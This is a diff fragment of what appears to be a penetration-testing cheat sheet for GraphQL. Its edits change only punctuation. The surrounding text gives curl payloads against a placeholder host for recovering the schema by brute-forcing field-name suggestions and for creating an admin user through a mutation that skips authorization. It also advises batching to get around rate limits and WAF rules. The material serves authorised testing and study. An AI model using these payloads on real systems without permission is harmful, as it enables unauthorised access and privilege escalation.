@@ -9,7 +9,7 @@ curl -s http://<IP>/graphql -H 'Content-Type: application/json' \
 - Try `/graphiql`, `/v1/graphql` if the app hints at them.
 
 ## Introspection disabled: field suggestions
-Many servers suggest a close field name in the error message even with introspection off — brute-forcing field names this way recovers the schema piece by piece:
+Many servers suggest a close field name in the error message even with introspection off. Brute-forcing field names this way recovers the schema piece by piece:
 ```bash
 curl -s http://<IP>/graphql -H 'Content-Type: application/json' \
   -d '{"query":"{usr{id}}"}'
@@ -30,7 +30,7 @@ curl -s http://<IP>/graphql -H 'Content-Type: application/json' \
 curl -s http://<IP>/graphql -H 'Content-Type: application/json' \
   -d '{"query":"mutation{createUser(username:\"<LOCAL-USER>\",password:\"<PW>\",role:\"admin\"){id}}"}'
 ```
-- Mutations often skip the authz check that the matching query enforces — test a privileged mutation as a low-privilege user even if the equivalent read is denied.
+- Mutations often skip the authz check the matching query enforces. Test a privileged mutation as a low-privilege user even if the equivalent read is denied.
 
 ## Batching
 Send an array of operations in one POST; some rate limits and WAF rules count requests, not operations inside one:
